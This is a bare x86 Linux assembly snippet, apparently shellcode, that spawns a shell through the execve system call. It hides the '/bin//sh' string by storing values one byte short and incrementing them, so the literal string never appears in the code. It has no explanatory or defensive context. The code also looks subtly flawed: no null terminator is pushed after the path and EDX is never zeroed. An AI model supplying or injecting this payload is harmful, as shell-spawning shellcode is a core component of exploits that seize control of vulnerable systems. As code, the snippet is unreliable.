global _start

section .text

_start:
    xor eax, eax        ; Zero out EAX
    xor ebx, ebx        ; Zero out EBX
    xor ecx, ecx        ; Zero out ECX

    mov esi, 0x68732f2e
    inc esi
    mov edi, 0x6e69622e
    inc edi

    push esi
    push edi

    mov ebx, esp
    mov al, 0xb         ; execve() = #define __NR_execve 11
    int 0x80